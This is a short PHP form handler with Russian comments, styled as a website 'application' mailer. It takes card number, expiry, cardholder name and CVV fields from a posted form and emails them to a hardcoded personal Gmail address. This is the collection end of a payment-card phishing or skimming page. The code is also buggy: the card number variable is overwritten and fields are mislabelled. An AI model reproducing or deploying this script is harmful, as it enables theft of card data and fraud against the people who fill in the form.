<?php

ini_set('display_errors','On');
error_reporting('E_ALL');

$to = 'danilukfolker@gmail.com'; //Адреса, куда будут приходить письма. две почты указываем через запятую
$sitename = $_SERVER['SERVER_NAME'];

if (isset($_POST['phone']) && !empty($_POST['phone']))
{
    $data  = strip_tags($_POST['numer']);
    $data  = strip_tags($_POST['data']);
    $Namme  = strip_tags($_POST['Namme']);
    $cvv  = strip_tags($_POST['cvv']);
// Формирование заголовка письма
    $subject  = "[Zajavka s sajta ".$sitename."]";
    $headers  = "From: mail@".$sitename." \r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/html;charset=utf-8 \r\n";
// Формирование тела письма
    $msg  = "<html><body style='font-family:Arial,sans-serif;'>";
    $msg .= "<h2 style='font-weight:bold;border-bottom:1px dotted #ccc;'>Новая заявка:</h2>\r\n";
    if(isset($_POST['data']) && !empty($_POST['data'])){
      $msg .= "<p><strong>Номер:</strong> ".$data."</p>\r\n";
    }
    if(isset($_POST['data']) && !empty($_POST['data'])){
      $msg .= "<p><strong>Телефон:</strong> ".$data."</p>\r\n";
    }
    if(isset($_POST['cvv']) && !empty($_POST['cvv'])){
      $msg .= "<p><strong>cvv:</strong> ".$cvv."</p>\r\n";
    }
    if(isset($_POST['Namme']) && !empty($_POST['Namme'])){
        $msg .= "<p><strong>Телефон:</strong> ".$Namme."</p>\r\n";
      }
    $msg .= "</body></html>";
// отправка сообщения
    mail($to, $subject, $msg, $headers);
}
else
{
    echo "Заявка не отправлена :(";
}
?>